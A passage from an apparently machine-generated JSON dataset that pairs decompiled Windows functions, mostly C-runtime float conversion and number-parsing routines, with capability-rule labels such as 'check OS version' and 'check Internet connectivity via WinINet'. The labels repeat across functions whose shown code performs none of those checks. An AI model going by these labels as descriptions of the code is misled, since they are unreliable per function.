        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_44h\n\nvoid __cdecl fcn.0041f5fb(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    uint8_t uVar3;\n    bool bVar4;\n    bool bVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint8_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    int32_t iVar12;\n    uint *puVar13;\n    int32_t iVar14;\n    int32_t iVar15;\n    uint32_t uVar16;\n    uint32_t uVar17;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x443998 ^ &stack0xfffffffc;\n    uVar1 = arg_8h[5];\n    iVar14 = 0;\n    uVar10 = uVar1 & 0x7fff;\n    uVar16 = *(arg_8h + 3);\n    iVar11 = uVar10 - 0x3fff;\n    var_10h = uVar16;\n    uVar17 = *(arg_8h + 1);\n    var_ch = uVar17;\n    uVar2 = *arg_8h;\n    var_8h = uVar2 << 0x10;\n    uVar3 = *0x443f18;\n    if (iVar11 == -0x3fff) {\n        iVar15 = 0;\n        iVar11 = 0;\n        do {\n            if ((&var_10h)[iVar11] != 0) {\n                var_10h = 0;\n                var_ch = 0;\n                var_8h = 0;\n                goto code_r0x0041f670;\n            }\n            iVar11 = iVar11 + 1;\n        } while (iVar11 < 3);\n    }\n    else {\n        iVar6 = *0x443f14 + -1;\n        bVar5 = false;\n        iVar15 = (*0x443f14 >> 0x1f & 0x1fU) + *0x443f14 >> 5;\n        uVar8 = 0x1f - (*0x443f14 & 0x1f);\n        if (((&var_10h)[iVar15] & 1 << (uVar8 & 0x1f)) != 0) {\n            uVar7 = (&var_10h)[iVar15] & ~(-1 << (uVar8 & 0x1f));\n            iVar12 = iVar15;\n            while (uVar7 == 0) {\n                iVar12 = iVar12 + 1;\n                if (2 < iVar12) goto code_r0x0041f770;\n                uVar7 = (&var_10h)[iVar12];\n            }\n            iVar12 = (iVar6 >> 0x1f & 0x1fU) + iVar6 >> 5;\n            bVar5 = false;\n            uVar7 = 1 << (0x1f - (iVar6 & 0x1f) & 0x1f);\n            uVar9 = uVar7 + (&var_10h)[iVar12];\n            bVar4 = false;\n            if ((uVar9 < (&var_10h)[iVar12]) || (uVar9 < uVar7)) {\n                bVar4 = true;\n                bVar5 = true;\n            }\n            (&var_10h)[iVar12] = uVar9;\n            while ((iVar12 = iVar12 + -1,  -1 < iVar12 && (bVar4))) {\n                bVar4 = false;\n                bVar5 = false;\n                uVar7 = (&var_10h)[iVar12] + 1;\n                if ((uVar7 < (&var_10h)[iVar12]) || (uVar7 == 0)) {\n                    bVar4 = true;\n                    bVar5 = true;\n                }\n                (&var_10h)[iVar12] = uVar7;\n            }\n        }\ncode_r0x0041f770:\n        (&var_10h)[iVar15] = (&var_10h)[iVar15] & -1 << (uVar8 & 0x1f);\n        iVar15 = iVar15 + 1;\n        if (iVar15 < 3) {\n            puVar13 = &var_10h + iVar15;\n            for (iVar12 = 3 - iVar15; iVar12 != 0; iVar12 = iVar12 + -1) {\n                *puVar13 = 0;\n                puVar13 = puVar13 + 1;\n            }\n        }\n        iVar15 = iVar11;\n        if (bVar5) {\n            iVar15 = uVar10 - 0x3ffe;\n        }\n        if (iVar15 < *0x443f10 - *0x443f14) {\n            var_10h = 0;\n            var_ch = 0;\n            var_8h = 0;\n        }\n        else {\n            if (*0x443f10 < iVar15) {\n                if (iVar15 < *0x443f0c) {\n                    var_10h = var_10h & 0x7fffffff;\n                    iVar15 = *0x443f20 + iVar15;\n                    iVar11 = *0x443f18 + (*0x443f18 >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar3 & 0x1f;\n                    var_20h = 0;\n                    iVar14 = 0;\n                    do {\n                        uVar16 = (&var_10h)[iVar14] >> uVar8 | var_20h;\n                        var_20h = ((&var_10h)[iVar14] & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        (&var_10h)[iVar14] = uVar16;\n                        iVar14 = iVar14 + 1;\n                    } while (iVar14 < 3);\n                    puVar13 = &var_8h + -iVar11;\n                    iVar14 = 2;\n                    do {\n                        if (iVar14 < iVar11) {\n                            (&var_10h)[iVar14] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar14] = *puVar13;\n                        }\n                        puVar13 = puVar13 + -1;\n                        iVar14 = iVar14 + -1;\n                    } while (-1 < iVar14);\n                }\n                else {\n                    var_ch = 0;\n                    var_8h = 0;\n                    var_10h = 0x80000000;\n                    iVar11 = *0x443f18 + (*0x443f18 >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar3 & 0x1f;\n                    var_20h = 0;\n                    do {\n                        uVar16 = (&var_10h)[iVar14] >> uVar8 | var_20h;\n                        var_20h = ((&var_10h)[iVar14] & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        (&var_10h)[iVar14] = uVar16;\n                        iVar14 = iVar14 + 1;\n                    } while (iVar14 < 3);\n                    puVar13 = &var_8h + -iVar11;\n                    iVar14 = 2;\n                    do {\n                        if (iVar14 < iVar11) {\n                            (&var_10h)[iVar14] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar14] = *puVar13;\n                        }\n                        puVar13 = puVar13 + -1;\n                        iVar14 = iVar14 + -1;\n                    } while (-1 < iVar14);\n                    iVar15 = *0x443f20 + *0x443f0c;\n                }\n                goto code_r0x0041fb21;\n            }\n            iVar11 = *0x443f10 - iVar11;\n            var_10h = uVar16;\n            iVar15 = iVar11 + (iVar11 >> 0x1f & 0x1fU) >> 5;\n            var_ch = uVar17;\n            var_8h = uVar2 << 0x10;\n            uVar8 = iVar11 & 0x1f;\n            var_20h = 0;\n            do {\n                uVar16 = (&var_10h)[iVar14] >> uVar8 | var_20h;\n                var_20h = ((&var_10h)[iVar14] & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                (&var_10h)[iVar14] = uVar16;\n                iVar14 = iVar14 + 1;\n            } while (iVar14 < 3);\n            puVar13 = &var_8h + -iVar15;\n            iVar11 = 2;\n            do {\n                if (iVar11 < iVar15) {\n                    (&var_10h)[iVar11] = 0;\n                }\n                else {\n                    (&var_10h)[iVar11] = *puVar13;\n                }\n                puVar13 = puVar13 + -1;\n                iVar11 = iVar11 + -1;\n            } while (-1 < iVar11);\n            iVar11 = (*0x443f14 >> 0x1f & 0x1fU) + *0x443f14 >> 5;\n            uVar8 = 0x1f - (*0x443f14 & 0x1f);\n            if (((&var_10h)[iVar11] & 1 << (uVar8 & 0x1f)) != 0) {\n                uVar16 = (&var_10h)[iVar11] & ~(-1 << (uVar8 & 0x1f));\n                iVar14 = iVar11;\n                while (uVar16 == 0) {\n                    iVar14 = iVar14 + 1;\n                    if (2 < iVar14) goto code_r0x0041f92b;\n                    uVar16 = (&var_10h)[iVar14];\n                }\n                iVar14 = (iVar6 >> 0x1f & 0x1fU) + iVar6 >> 5;\n                uVar16 = 1 << (0x1f - (iVar6 & 0x1f) & 0x1f);\n                bVar5 = false;\n                uVar17 = uVar16 + (&var_10h)[iVar14];\n                if ((uVar17 < (&var_10h)[iVar14]) || (uVar17 < uVar16)) {\n                    bVar5 = true;\n                }\n                (&var_10h)[iVar14] = uVar17;\n                while ((iVar14 = iVar14 + -1,  -1 < iVar14 && (bVar5))) {\n                    bVar5 = false;\n                    uVar16 = (&var_10h)[iVar14] + 1;\n                    if ((uVar16 < (&var_10h)[iVar14]) || (uVar16 == 0)) {\n                        bVar5 = true;\n                    }\n                    (&var_10h)[iVar14] = uVar16;\n                }\n            }\ncode_r0x0041f92b:\n            (&var_10h)[iVar11] = (&var_10h)[iVar11] & -1 << (uVar8 & 0x1f);\n            iVar11 = iVar11 + 1;\n            if (iVar11 < 3) {\n                puVar13 = &var_10h + iVar11;\n                for (iVar14 = 3 - iVar11; iVar14 != 0; iVar14 = iVar14 + -1) {\n                    *puVar13 = 0;\n                    puVar13 = puVar13 + 1;\n                }\n            }\n            iVar14 = *0x443f18 + 1;\n            iVar11 = iVar14 + (iVar14 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = iVar14 & 0x1f;\n            var_20h = 0;\n            var_34h = 0;\n            do {\n                uVar16 = (&var_10h)[var_34h];\n                (&var_10h)[var_34h] = uVar16 >> uVar8 | var_20h;\n                var_20h = (uVar16 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                var_34h = var_34h + 1;\n            } while (var_34h < 3);\n            puVar13 = &var_8h + -iVar11;\n            iVar14 = 2;\n            do {\n                if (iVar14 < iVar11) {\n                    (&var_10h)[iVar14] = 0;\n                }\n                else {\n                    (&var_10h)[iVar14] = *puVar13;\n                }\n                puVar13 = puVar13 + -1;\n                iVar14 = iVar14 + -1;\n            } while (-1 < iVar14);\n        }\ncode_r0x0041f670:\n        iVar15 = 0;\n    }\ncode_r0x0041fb21:\n    uVar16 = iVar15 << (0x1f - uVar3 & 0x1f) | -((uVar1 & 0x8000) != 0) & 0x80000000 | var_10h;\n    if (*0x443f1c == 0x40) {\n        arg_ch[1] = uVar16;\n        *arg_ch = var_ch;\n    }\n    else if (*0x443f1c == 0x20) {\n        *arg_ch = uVar16;\n    }\n    fcn.00406eb1(uVar1 & 0x8000);\n    return;\n}\n",
        "token_count": 3207
    },
    "00420317": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00420621)\n// WARNING: Removing unreachable block (ram,0x0042062a)\n// WARNING: Removing unreachable block (ram,0x00420a5e)\n// WARNING: Removing unreachable block (ram,0x00420687)\n// WARNING: Removing unreachable block (ram,0x004206a5)\n// WARNING: Removing unreachable block (ram,0x0042068c)\n// WARNING: Removing unreachable block (ram,0x00420693)\n// WARNING: Removing unreachable block (ram,0x00420698)\n// WARNING: Removing unreachable block (ram,0x004206a8)\n// WARNING: Removing unreachable block (ram,0x00420a54)\n// WARNING: Removing unreachable block (ram,0x004206b0)\n// WARNING: Removing unreachable block (ram,0x004206b5)\n// WARNING: Removing unreachable block (ram,0x004206bc)\n// WARNING: Removing unreachable block (ram,0x004206bf)\n// WARNING: Removing unreachable block (ram,0x004206d7)\n// WARNING: Removing unreachable block (ram,0x004206d9)\n// WARNING: Removing unreachable block (ram,0x004206e3)\n// WARNING: Removing unreachable block (ram,0x004206e6)\n// WARNING: Removing unreachable block (ram,0x004206ed)\n// WARNING: Removing unreachable block (ram,0x004206f0)\n// WARNING: Removing unreachable block (ram,0x00420a46)\n// WARNING: Removing unreachable block (ram,0x00420a64)\n// WARNING: Removing unreachable block (ram,0x004206fc)\n// WARNING: Removing unreachable block (ram,0x00420a37)\n// WARNING: Removing unreachable block (ram,0x00420708)\n// WARNING: Removing unreachable block (ram,0x00420718)\n// WARNING: Removing unreachable block (ram,0x0042071a)\n// WARNING: Removing unreachable block (ram,0x00420724)\n// WARNING: Removing unreachable block (ram,0x0042072d)\n// WARNING: Removing unreachable block (ram,0x00420a1d)\n// WARNING: Removing unreachable block (ram,0x00420738)\n// WARNING: Removing unreachable block (ram,0x0042074f)\n// WARNING: Removing unreachable block (ram,0x00420761)\n// WARNING: Removing unreachable block (ram,0x00420772)\n// WARNING: Removing unreachable block (ram,0x004207b1)\n// WARNING: Removing unreachable block (ram,0x004207ba)\n// WARNING: Removing unreachable block (ram,0x004209fa)\n// WARNING: Removing unreachable block (ram,0x004207c8)\n// WARNING: Removing unreachable block (ram,0x004207da)\n// WARNING: Removing unreachable block (ram,0x004207df)\n// WARNING: Removing unreachable block (ram,0x004207ec)\n// WARNING: Removing unreachable block (ram,0x004207f2)\n// WARNING: Removing unreachable block (ram,0x004207f8)\n// WARNING: Removing unreachable block (ram,0x00420803)\n// WARNING: Removing unreachable block (ram,0x00420808)\n// WARNING: Removing unreachable block (ram,0x00420815)\n// WARNING: Removing unreachable block (ram,0x0042081a)\n// WARNING: Removing unreachable block (ram,0x004207d2)\n// WARNING: Removing unreachable block (ram,0x00420a11)\n// WARNING: Removing unreachable block (ram,0x00420a17)\n// WARNING: Removing unreachable block (ram,0x0042081e)\n// WARNING: Removing unreachable block (ram,0x0042082c)\n// WARNING: Removing unreachable block (ram,0x00420833)\n// WARNING: Removing unreachable block (ram,0x0042083f)\n// WARNING: Removing unreachable block (ram,0x0042085f)\n// WARNING: Removing unreachable block (ram,0x00420864)\n// WARNING: Removing unreachable block (ram,0x00420869)\n// WARNING: Removing unreachable block (ram,0x0042086c)\n// WARNING: Removing unreachable block (ram,0x00420873)\n// WARNING: Removing unreachable block (ram,0x00420876)\n// WARNING: Removing unreachable block (ram,0x00420882)\n// WARNING: Removing unreachable block (ram,0x0042088b)\n// WARNING: Removing unreachable block (ram,0x0042089a)\n// WARNING: Removing unreachable block (ram,0x004208b1)\n// WARNING: Removing unreachable block (ram,0x004208b5)\n// WARNING: Removing unreachable block (ram,0x004208e7)\n// WARNING: Removing unreachable block (ram,0x004208ec)\n// WARNING: Removing unreachable block (ram,0x004208f8)\n// WARNING: Removing unreachable block (ram,0x00420907)\n// WARNING: Removing unreachable block (ram,0x0042090d)\n// WARNING: Removing unreachable block (ram,0x0042090e)\n// WARNING: Removing unreachable block (ram,0x00420939)\n// WARNING: Removing unreachable block (ram,0x00420943)\n// WARNING: Removing unreachable block (ram,0x00420955)\n// WARNING: Removing unreachable block (ram,0x00420959)\n// WARNING: Removing unreachable block (ram,0x00420963)\n// WARNING: Removing unreachable block (ram,0x00420971)\n// WARNING: Removing unreachable block (ram,0x004209ad)\n// WARNING: Removing unreachable block (ram,0x00420979)\n// WARNING: Removing unreachable block (ram,0x004209a4)\n// WARNING: Removing unreachable block (ram,0x00420984)\n// WARNING: Removing unreachable block (ram,0x0042099c)\n// WARNING: Removing unreachable block (ram,0x00420995)\n// WARNING: Removing unreachable block (ram,0x004209a8)\n// WARNING: Removing unreachable block (ram,0x004209b1)\n// WARNING: Removing unreachable block (ram,0x004209b4)\n// WARNING: Removing unreachable block (ram,0x004209e0)\n// WARNING: Removing unreachable block (ram,0x004209c1)\n// WARNING: Removing unreachable block (ram,0x00420a1a)\n// WARNING: Removing unreachable block (ram,0x00420a25)\n// WARNING: Removing unreachable block (ram,0x00420a69)\n// WARNING: Variable defined which should be unmapped: var_80h\n\nvoid __cdecl\nfcn.00420317(uint arg_8h, uint arg_ch, char *arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            int32_t arg_24h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_3ch;\n    uint var_34h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_9h;\n    uint var_4h;\n    \n    if (arg_24h == 0) {\n        puVar2 = fcn.00409004();\n        *puVar2 = 0x16;\n        fcn.00407cd0();\n        fcn.00406eb1(arg_8h);\n        return;\n    }\n    for (; (((cVar1 = *arg_10h,  cVar1 == ' ' || (cVar1 == '\\t')) || (cVar1 == '\\n')) || (cVar1 == '\\r'));\n        arg_10h = arg_10h + 1) {\n    }\n    // WARNING: Could not recover jumptable at 0x004203a6. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (12 cases) at 0x420a8f\n    (**0x420a8f)();\n    return;\n}\n",
        "token_count": 1856
    },
    "00426eff": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00426eff(uint8_t *arg_8h, uint8_t **arg_ch, uint arg_10h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    uint unaff_EBX;\n    uint8_t *arg_ch_00;\n    int32_t var_2ch;\n    int32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x443998 ^ &stack0xfffffffc;\n    fcn.00408312(arg_10h);\n    if (arg_ch != NULL) {\n        *arg_ch = arg_8h;\n    }\n    iVar4 = var_2ch;\n    arg_ch_00 = arg_8h;\n    if (arg_8h == NULL) {\n        puVar1 = fcn.00409004();\n        *puVar1 = 0x16;\n        fcn.00407cd0();\n    }\n    else {\n        while( true ) {\n            if (*(iVar4 + 0x74) < 2) {\n                uVar2 = *(*(iVar4 + 0x90) + *arg_ch_00 * 2) & 8;\n            }\n            else {\n                uVar2 = fcn.0041d5bb(*arg_ch_00, 8, &var_2ch);\n                iVar4 = var_2ch;\n            }\n            if (uVar2 == 0) break;\n            arg_ch_00 = arg_ch_00 + 1;\n        }\n        puVar3 = fcn.0042775d(&var_1ch, arg_ch_00, &var_2ch);\n        if (arg_ch != NULL) {\n            *arg_ch = arg_ch_00 + puVar3[1];\n        }\n        if ((*puVar3 & 0x240) == 0) {\n            if ((*puVar3 & 0x81) == 0) {\n                if (((*puVar3 & 0x100) != 0) && (*(puVar3 + 4) == 0.0)) {\n                    puVar1 = fcn.00409004();\n                    *puVar1 = 0x22;\n                }\n            }\n            else {\n                puVar1 = fcn.00409004();\n                *puVar1 = 0x22;\n            }\n        }\n        else if (arg_ch != NULL) {\n            *arg_ch = arg_8h;\n        }\n    }\n    if (var_20h != '\\0') {\n        *(var_24h + 0x70) = *(var_24h + 0x70) & 0xfffffffd;\n    }\n    fcn.00406eb1(unaff_EBX);\n    return;\n}\n",
        "token_count": 640
    },
    "00422982": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00422982(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_8h_00;\n    \n    if (*0x445dc4 == 0) {\n        arg_8h_00 = 0x443e48;\n    }\n    else {\n        arg_8h_00 = 0;\n    }\n    fcn.004226f2(arg_8h_00, arg_8h, arg_ch, arg_10h, 0);\n    return;\n}\n",
        "token_count": 118
    },
    "004229d9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004229d9(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_8h_00;\n    \n    if (*0x445dc4 == 0) {\n        arg_8h_00 = 0x443e48;\n    }\n    else {\n        arg_8h_00 = 0;\n    }\n    fcn.004226f2(arg_8h_00, arg_8h, arg_ch, arg_10h, 1);\n    return;\n}\n",
        "token_count": 119
    },
    "004280da": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004280da(uint16_t *arg_8h, uint16_t **arg_ch, uint arg_10h)\n\n{\n    uint16_t uVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint32_t *puVar4;\n    uint unaff_EBX;\n    uint16_t *arg_ch_00;\n    uint var_34h;\n    int32_t var_2ch;\n    uint var_28h;\n    double dStack40;\n    uint var_1ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x443998 ^ &stack0xfffffffc;\n    fcn.00408312(arg_10h);\n    if (arg_ch != NULL) {\n        *arg_ch = arg_8h;\n    }\n    if (arg_8h == NULL) {\n        puVar2 = fcn.00409004();\n        *puVar2 = 0x16;\n        fcn.00407cd0();\n    }\n    else {\n        uVar1 = *arg_8h;\n        arg_ch_00 = arg_8h;\n        while (iVar3 = fcn.0041cded(uVar1, 8),  iVar3 != 0) {\n            arg_ch_00 = arg_ch_00 + 1;\n            uVar1 = *arg_ch_00;\n        }\n        puVar4 = fcn.00428219(&var_1ch, arg_ch_00, &var_34h);\n        if (arg_ch != NULL) {\n            *arg_ch = arg_ch_00 + puVar4[1];\n        }\n        if ((*puVar4 & 0x240) == 0) {\n            if ((*puVar4 & 0x81) == 0) {\n                if (((*puVar4 & 0x100) != 0) && (*(puVar4 + 4) == 0.0)) {\n                    puVar2 = fcn.00409004();\n                    *puVar2 = 0x22;\n                }\n            }\n            else {\n                dStack40 = *0x4441f0;\n                if (*arg_ch_00 == 0x2d) {\n                    dStack40 = -*0x4441f0;\n                }\n                puVar2 = fcn.00409004();\n                *puVar2 = 0x22;\n            }\n        }\n        else if (arg_ch != NULL) {\n            *arg_ch = arg_8h;\n        }\n    }\n    if (var_28h != '\\0') {\n        *(var_2ch + 0x70) = *(var_2ch + 0x70) & 0xfffffffd;\n    }\n    fcn.00406eb1(unaff_EBX);\n    return;\n}\n",
        "token_count": 620
    },
    "00427da4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00427da4(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_8h_00;\n    \n    if (*0x445dc4 == 0) {\n        arg_8h_00 = 0x443e48;\n    }\n    else {\n        arg_8h_00 = 0;\n    }\n    fcn.00427a21(arg_8h_00, arg_8h, arg_ch, arg_10h, 0);\n    return;\n}\n",
        "token_count": 119
    },
    "00427dfb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00427dfb(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_8h_00;\n    \n    if (*0x445dc4 == 0) {\n        arg_8h_00 = 0x443e48;\n    }\n    else {\n        arg_8h_00 = 0;\n    }\n    fcn.00427a21(arg_8h_00, arg_8h, arg_ch, arg_10h, 1);\n    return;\n}\n",
        "token_count": 119
    },
    "0042831d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004286db)\n// WARNING: Removing unreachable block (ram,0x0042865b)\n// WARNING: Removing unreachable block (ram,0x00428b0c)\n// WARNING: Removing unreachable block (ram,0x0042866d)\n// WARNING: Removing unreachable block (ram,0x00428752)\n// WARNING: Removing unreachable block (ram,0x00428679)\n// WARNING: Removing unreachable block (ram,0x00428680)\n// WARNING: Removing unreachable block (ram,0x00428685)\n// WARNING: Removing unreachable block (ram,0x00428755)\n// WARNING: Removing unreachable block (ram,0x00428b02)\n// WARNING: Removing unreachable block (ram,0x0042875d)\n// WARNING: Removing unreachable block (ram,0x00428763)\n// WARNING: Removing unreachable block (ram,0x0042876b)\n// WARNING: Removing unreachable block (ram,0x0042876e)\n// WARNING: Removing unreachable block (ram,0x00428786)\n// WARNING: Removing unreachable block (ram,0x00428788)\n// WARNING: Removing unreachable block (ram,0x00428792)\n// WARNING: Removing unreachable block (ram,0x00428795)\n// WARNING: Removing unreachable block (ram,0x0042879c)\n// WARNING: Removing unreachable block (ram,0x0042879f)\n// WARNING: Removing unreachable block (ram,0x00428af4)\n// WARNING: Removing unreachable block (ram,0x00428b12)\n// WARNING: Removing unreachable block (ram,0x004287ab)\n// WARNING: Removing unreachable block (ram,0x00428ae7)\n// WARNING: Removing unreachable block (ram,0x004287b7)\n// WARNING: Removing unreachable block (ram,0x004287c7)\n// WARNING: Removing unreachable block (ram,0x004287c9)\n// WARNING: Removing unreachable block (ram,0x004287d3)\n// WARNING: Removing unreachable block (ram,0x004287dd)\n// WARNING: Removing unreachable block (ram,0x00428acd)\n// WARNING: Removing unreachable block (ram,0x004287e8)\n// WARNING: Removing unreachable block (ram,0x004287ff)\n// WARNING: Removing unreachable block (ram,0x00428811)\n// WARNING: Removing unreachable block (ram,0x00428822)\n// WARNING: Removing unreachable block (ram,0x00428861)\n// WARNING: Removing unreachable block (ram,0x0042886a)\n// WARNING: Removing unreachable block (ram,0x00428aaa)\n// WARNING: Removing unreachable block (ram,0x00428878)\n// WARNING: Removing unreachable block (ram,0x0042888a)\n// WARNING: Removing unreachable block (ram,0x0042888f)\n// WARNING: Removing unreachable block (ram,0x0042889c)\n// WARNING: Removing unreachable block (ram,0x004288a2)\n// WARNING: Removing unreachable block (ram,0x004288a8)\n// WARNING: Removing unreachable block (ram,0x004288b3)\n// WARNING: Removing unreachable block (ram,0x004288b8)\n// WARNING: Removing unreachable block (ram,0x004288c5)\n// WARNING: Removing unreachable block (ram,0x004288ca)\n// WARNING: Removing unreachable block (ram,0x00428882)\n// WARNING: Removing unreachable block (ram,0x00428ac1)\n// WARNING: Removing unreachable block (ram,0x00428ac7)\n// WARNING: Removing unreachable block (ram,0x004288ce)\n// WARNING: Removing unreachable block (ram,0x004288dc)\n// WARNING: Removing unreachable block (ram,0x004288e3)\n// WARNING: Removing unreachable block (ram,0x004288ef)\n// WARNING: Removing unreachable block (ram,0x0042890f)\n// WARNING: Removing unreachable block (ram,0x00428914)\n// WARNING: Removing unreachable block (ram,0x00428919)\n// WARNING: Removing unreachable block (ram,0x0042891c)\n// WARNING: Removing unreachable block (ram,0x00428923)\n// WARNING: Removing unreachable block (ram,0x00428926)\n// WARNING: Removing unreachable block (ram,0x00428932)\n// WARNING: Removing unreachable block (ram,0x0042893b)\n// WARNING: Removing unreachable block (ram,0x0042894a)\n// WARNING: Removing unreachable block (ram,0x00428961)\n// WARNING: Removing unreachable block (ram,0x00428965)\n// WARNING: Removing unreachable block (ram,0x00428997)\n// WARNING: Removing unreachable block (ram,0x0042899c)\n// WARNING: Removing unreachable block (ram,0x004289a8)\n// WARNING: Removing unreachable block (ram,0x004289b7)\n// WARNING: Removing unreachable block (ram,0x004289bd)\n// WARNING: Removing unreachable block (ram,0x004289be)\n// WARNING: Removing unreachable block (ram,0x004289e9)\n// WARNING: Removing unreachable block (ram,0x004289f3)\n// WARNING: Removing unreachable block (ram,0x00428a05)\n// WARNING: Removing unreachable block (ram,0x00428a09)\n// WARNING: Removing unreachable block (ram,0x00428a13)\n// WARNING: Removing unreachable block (ram,0x00428a21)\n// WARNING: Removing unreachable block (ram,0x00428a5d)\n// WARNING: Removing unreachable block (ram,0x00428a29)\n// WARNING: Removing unreachable block (ram,0x00428a54)\n// WARNING: Removing unreachable block (ram,0x00428a34)\n// WARNING: Removing unreachable block (ram,0x00428a4c)\n// WARNING: Removing unreachable block (ram,0x00428a45)\n// WARNING: Removing unreachable block (ram,0x00428a58)\n// WARNING: Removing unreachable block (ram,0x00428a61)\n// WARNING: Removing unreachable block (ram,0x00428a64)\n// WARNING: Removing unreachable block (ram,0x00428a90)\n// WARNING: Removing unreachable block (ram,0x00428a71)\n// WARNING: Removing unreachable block (ram,0x00428aca)\n// WARNING: Removing unreachable block (ram,0x00428ad5)\n// WARNING: Removing unreachable block (ram,0x00428b17)\n// WARNING: Variable defined which should be unmapped: var_80h\n\nvoid __cdecl\nfcn.0042831d(uint arg_8h, uint arg_ch, int16_t *arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            int32_t arg_24h)\n\n{\n    int16_t iVar1;\n    uint *puVar2;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_3ch;\n    uint var_34h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_9h;\n    uint var_4h;\n    \n    if (arg_24h == 0) {\n        puVar2 = fcn.00409004();\n        *puVar2 = 0x16;\n        fcn.00407cd0();\n        fcn.00406eb1(arg_8h);\n        return;\n    }\n    for (; (((iVar1 = *arg_10h,  iVar1 == 0x20 || (iVar1 == 9)) || (iVar1 == 10)) || (iVar1 == 0xd));\n        arg_10h = arg_10h + 1) {\n    }\n    // WARNING: Could not recover jumptable at 0x004283d5. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (12 cases) at 0x428b3d\n    (**0x428b3d)();\n    return;\n}\n",
        "token_count": 1869
    },
    "004052e0": {
        "rules": [
